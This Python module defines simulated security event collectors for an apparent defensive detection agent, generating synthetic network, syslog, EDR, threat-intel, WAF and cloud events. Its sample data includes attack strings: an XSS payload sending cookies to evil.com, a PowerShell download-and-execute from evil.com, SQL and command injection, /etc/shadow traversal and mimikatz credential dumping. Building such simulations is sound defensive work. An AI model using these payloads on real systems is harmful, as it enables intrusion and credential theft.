"""
Event Collectors
Network, Syslog, EDR, Threat Intel, WAF, Cloud — all with simulation mode
"""

import asyncio
import json
import logging
import random
import socket
from datetime import datetime
from pathlib import Path
from core.agent import Event

logger = logging.getLogger("CDA.Collectors")


class BaseCollector:
    async def collect(self) -> list[Event]:
        raise NotImplementedError


def _ev(src, dst, etype, raw, source) -> Event:
    return Event(source_ip=src, dest_ip=dst, timestamp=datetime.now(),
                 event_type=etype, raw_data=raw, source=source)


# ──────────────────────────────────────────────────────────────
# Network Collector
# ──────────────────────────────────────────────────────────────

class NetworkCollector(BaseCollector):
    ATTACK_SCENARIOS = [
        # SQL injection
        {"event_type": "http_request", "dest_port": 80,
         "payload": "' UNION SELECT username,password FROM users--",
         "url": "/login", "user_agent": "Mozilla/5.0"},
        # XSS
        {"event_type": "http_request", "dest_port": 80,
         "payload": '<script>document.location="http://evil.com/"+document.cookie</script>',
         "url": "/comment", "user_agent": "Chrome/120"},
        # Command injection
        {"event_type": "http_request", "dest_port": 80,
         "payload": "; cat /etc/passwd", "url": "/ping", "user_agent": "curl/7.68"},
        # Path traversal
        {"event_type": "http_request", "dest_port": 80,
         "payload": "", "url": "/../../../etc/shadow", "user_agent": "Nikto/2.1"},
        # C2 beacon
        {"event_type": "http_request", "dest_port": 443,
         "url": "/c2/beacon?id=abc123", "user_agent": "WinHTTP"},
        # Port scan
        {"event_type": "connection_attempt", "dest_port": random.randint(1, 65535), "bytes_out": 60},
        # Normal traffic
        {"event_type": "http_request", "dest_port": 443,
         "url": "/api/products", "user_agent": "Mozilla/5.0 Chrome/120", "bytes_out": 1200},
        # Data exfiltration
        {"event_type": "data_transfer", "dest_port": 21, "bytes_out": 80_000_000},
        # DoS flood
        {"event_type": "http_request", "dest_port": 80,
         "url": "/", "user_agent": "flood-bot/1.0", "bytes_out": 100},
        # DNS tunneling
        {"event_type": "dns_query",
         "query": "dGhpcyBpcyBhIHZlcnkgbG9uZyBzdWJkb21haW4gdXNlZCBmb3IgZG5zIHR1bm5lbGluZw==.evil.com"},
        # RAT port
        {"event_type": "connection_attempt", "dest_port": 4444, "bytes_out": 512},
        # Phishing URL
        {"event_type": "http_request", "dest_port": 80,
         "url": "http://paypal-secure-login.evil.ru/account", "user_agent": "Mozilla/5.0"},
        # Mimikatz
        {"event_type": "http_request", "dest_port": 80,
         "command": "mimikatz sekurlsa::logonpasswords", "url": "/exec"},
        # Ransomware file drop
        {"event_type": "file_access", "filename": "report.docx.wcry",
         "file_path": "C:\\Users\\bob\\Documents\\report.docx.wcry"},
    ]

    NORMAL_TRAFFIC = [
        {"event_type": "http_request", "dest_port": 443,
         "url": "/api/v1/users", "user_agent": "Mozilla/5.0", "bytes_out": 800},
        {"event_type": "http_request", "dest_port": 80,
         "url": "/index.html", "user_agent": "Chrome/120", "bytes_out": 200},
        {"event_type": "data_transfer", "dest_port": 443, "bytes_out": 1024},
    ]

    def __init__(self, interface="eth0", simulate=True, attack_rate=0.35):
        self.interface   = interface
        self.simulate    = simulate
        self.attack_rate = attack_rate

    async def collect(self) -> list[Event]:
        if self.simulate:
            return self._sim()
        return []

    def _sim(self) -> list[Event]:
        events = []
        ips = [f"10.0.{random.randint(0,9)}.{random.randint(1,254)}" for _ in range(3)]
        dst = f"192.168.1.{random.randint(1,20)}"
        for src in ips:
            if random.random() < self.attack_rate:
                raw = dict(random.choice(self.ATTACK_SCENARIOS))
                # Fix randomized port inside scenario
                if raw.get("dest_port") == "random":
                    raw["dest_port"] = random.randint(1, 65535)
                events.append(_ev(src, dst, raw.get("event_type","http_request"), raw, "network"))
            else:
                raw = dict(random.choice(self.NORMAL_TRAFFIC))
                events.append(_ev(src, dst, raw["event_type"], raw, "network"))
        return events


# ──────────────────────────────────────────────────────────────
# Syslog Collector
# ──────────────────────────────────────────────────────────────

class SyslogCollector(BaseCollector):
    TEMPLATES = [
        ("auth_failure",   "Failed password for root from {ip} port 22 ssh2"),
        ("auth_failure",   "Failed password for admin from {ip} port 22 ssh2"),
        ("auth_success",   "Accepted publickey for deploy from {ip} port 50234"),
        ("auth_failure",   "Invalid user admin from {ip} port 45678"),
        ("process_start",  "Started suspicious script /tmp/.hidden/payload.sh as root"),
        ("file_access",    "File accessed: /etc/shadow by uid=1001"),
        ("data_transfer",  "FTP transfer 92MB to {ip} from user bob"),
        ("auth_success",   "sudo: root session opened for user nobody"),
        ("print_job",      "Large print job 400 pages at 02:30 by user alice"),
    ]

    def __init__(self, host="0.0.0.0", port=514, simulate=True):
        self.host     = host
        self.port     = port
        self.simulate = simulate

    async def collect(self) -> list[Event]:
        if self.simulate:
            return self._sim()
        return []

    def _sim(self) -> list[Event]:
        ip  = f"10.{random.randint(0,5)}.{random.randint(0,5)}.{random.randint(1,254)}"
        t   = random.choice(self.TEMPLATES)
        msg = t[1].format(ip=ip)
        extra = {}
        if t[0] == "auth_success" and datetime.now().hour in range(22, 6):
            extra["username"] = "bob"
        if t[0] == "data_transfer":
            extra["bytes_out"] = 92_000_000
        if t[0] == "file_access":
            extra["file_path"] = "/etc/shadow"
            extra["username"]  = "attacker"
        return [_ev(ip, "local", t[0], {"message": msg, **extra}, "syslog")]


# ──────────────────────────────────────────────────────────────
# EDR Collector
# ──────────────────────────────────────────────────────────────

class EDRCollector(BaseCollector):
    PROCESS_EVENTS = [
        {"event_type": "process_start", "process": "cmd.exe", "parent": "winword.exe",
         "command": "cmd.exe /c powershell -enc JAB..."},
        {"event_type": "process_start", "process": "powershell.exe",
         "command": "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')"},
        {"event_type": "process_start", "process": "mimikatz.exe",
         "command": "mimikatz sekurlsa::logonpasswords"},
        {"event_type": "file_access", "filename": "lsass.dmp",
         "file_path": "C:\\Windows\\Temp\\lsass.dmp", "process": "procdump.exe"},
        {"event_type": "file_access", "filename": "data.wcry",
         "file_path": "C:\\Users\\Public\\data.wcry"},
        {"event_type": "process_start", "process": "psexec.exe",
         "command": "psexec \\\\192.168.1.50 cmd"},
        {"event_type": "process_start", "process": "notepad.exe",
         "command": "notepad.exe report.txt"},   # normal
        {"event_type": "process_start", "process": "chrome.exe",
         "command": "chrome.exe https://google.com"},  # normal
    ]

    def __init__(self, simulate=True):
        self.simulate = simulate

    async def collect(self) -> list[Event]:
        if not self.simulate:
            return []
        if random.random() > 0.4:
            return []
        src = f"192.168.1.{random.randint(10,50)}"
        raw = dict(random.choice(self.PROCESS_EVENTS))
        return [_ev(src, "local", raw["event_type"], raw, "edr")]


# ──────────────────────────────────────────────────────────────
# Threat Intel Collector
# ──────────────────────────────────────────────────────────────

class ThreatIntelCollector(BaseCollector):
    KNOWN_BAD = {
        "185.220.101.5":  {"type": "c2_ip",     "malware": "Cobalt Strike", "confidence": 0.97},
        "91.234.99.187":  {"type": "c2_ip",     "malware": "Emotet",        "confidence": 0.95},
        "103.76.228.95":  {"type": "scanner",   "malware": "Masscan",       "confidence": 0.88},
        "198.199.80.130": {"type": "tor_exit",  "malware": "Tor",           "confidence": 0.80},
        "bad-domain.ru":  {"type": "c2_domain", "malware": "APT-28",        "confidence": 0.91},
        "45.142.212.100": {"type": "c2_ip",     "malware": "AsyncRAT",      "confidence": 0.93},
    }

    def __init__(self, ioc_file="config/ioc_list.json", simulate=True):
        self.simulate = simulate
        self._iocs    = dict(self.KNOWN_BAD)
        if Path(ioc_file).exists():
            try:
                with open(ioc_file) as f:
                    self._iocs.update(json.load(f))
            except Exception: pass

    async def collect(self) -> list[Event]:
        if not self.simulate or random.random() > 0.08:
            return []
        ioc_ip, meta = random.choice(list(self._iocs.items()))
        raw = {"ioc": ioc_ip, "meta": meta,
               "url": "/c2/beacon?id=" + str(random.randint(100,999)),
               "dest_port": 443}
        return [_ev(ioc_ip, f"192.168.1.{random.randint(1,20)}",
                    "http_request", raw, "threat_intel")]


# ──────────────────────────────────────────────────────────────
# WAF Log Collector
# ──────────────────────────────────────────────────────────────

class WAFCollector(BaseCollector):
    EVENTS = [
        {"event_type": "http_request", "dest_port": 80,
         "url": "/wp-admin", "user_agent": "WPScan/3.8", "waf_action": "blocked"},
        {"event_type": "http_request", "dest_port": 443,
         "payload": "OR 1=1 --", "url": "/search", "waf_action": "blocked"},
        {"event_type": "http_request", "dest_port": 80,
         "url": "/.env", "user_agent": "python-requests/2.28", "waf_action": "blocked"},
        {"event_type": "http_request", "dest_port": 80,
         "url": "/api/products", "waf_action": "allowed"},  # normal
    ]

    def __init__(self, simulate=True):
        self.simulate = simulate

    async def collect(self) -> list[Event]:
        if not self.simulate or random.random() > 0.3:
            return []
        src = f"10.0.{random.randint(0,5)}.{random.randint(1,254)}"
        raw = dict(random.choice(self.EVENTS))
        return [_ev(src, "192.168.1.1", raw["event_type"], raw, "waf")]


# ──────────────────────────────────────────────────────────────
# Cloud Event Collector (AWS CloudTrail / Azure Monitor sim)
# ──────────────────────────────────────────────────────────────

class CloudCollector(BaseCollector):
    EVENTS = [
        {"event_type": "auth_success", "service": "S3", "action": "GetObject",
         "resource": "s3://prod-backups/db.sql.gz", "username": "compromised-svc"},
        {"event_type": "data_transfer", "service": "S3", "bytes_out": 2_000_000_000,
         "resource": "s3://customer-data", "username": "ex-employee"},
        {"event_type": "auth_failure",  "service": "IAM",
         "action": "AssumeRole", "username": "attacker"},
        {"event_type": "process_start", "service": "Lambda",
         "action": "CreateFunction", "runtime": "python3.9",
         "username": "leaked-key-user"},
        {"event_type": "auth_success",  "service": "EC2",
         "action": "RunInstances", "count": 50, "username": "cryptominer"},
        {"event_type": "auth_success",  "service": "S3",
         "action": "PutObject", "resource": "s3://app-static/image.jpg",
         "username": "web-app"},   # normal
    ]

    def __init__(self, simulate=True):
        self.simulate = simulate

    async def collect(self) -> list[Event]:
        if not self.simulate or random.random() > 0.25:
            return []
        src = f"cloud-{random.choice(['us-east-1','eu-west-1','ap-south-1'])}"
        raw = dict(random.choice(self.EVENTS))
        return [_ev(src, "cloud", raw["event_type"], raw, "cloud")]
